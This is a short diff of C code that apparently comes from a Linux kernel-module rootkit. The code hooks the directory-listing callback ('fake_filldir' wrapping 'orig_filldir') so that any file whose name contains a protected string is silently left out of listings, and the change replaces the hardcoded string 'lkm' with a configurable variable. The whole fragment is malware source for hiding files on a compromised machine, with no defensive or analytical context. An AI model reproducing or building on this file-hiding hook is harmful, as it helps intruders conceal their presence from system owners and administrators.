@@ -19,9 +19,7 @@ readdir_t orig_readdir = NULL;
 static int fake_filldir(void *__buff, const char *name, int namelen,
 			loff_t offset, u64 ino, unsigned int d_type)
 {
-	char *get_protect = "lkm";
-	
-	if (strstr(name, get_protect))
+	if (strstr(name, protect_filename))
 		return 0;
 	
 	return orig_filldir(__buff, name, namelen, offset, ino, d_type);
